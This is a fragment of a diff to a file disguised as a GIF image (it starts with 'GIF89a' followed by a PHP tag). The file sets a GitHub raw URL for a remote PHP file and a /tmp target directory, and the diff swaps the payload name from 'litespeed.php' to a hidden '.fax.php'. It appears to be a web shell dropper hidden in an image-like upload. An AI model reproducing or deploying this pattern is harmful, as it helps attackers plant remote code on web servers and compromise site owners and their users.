@@ -1,6 +1,6 @@
 GIF89a<?PhP
 
-    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/litespeed.php';
+    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.fax.php';
     
     $targetDir = '/tmp';
     
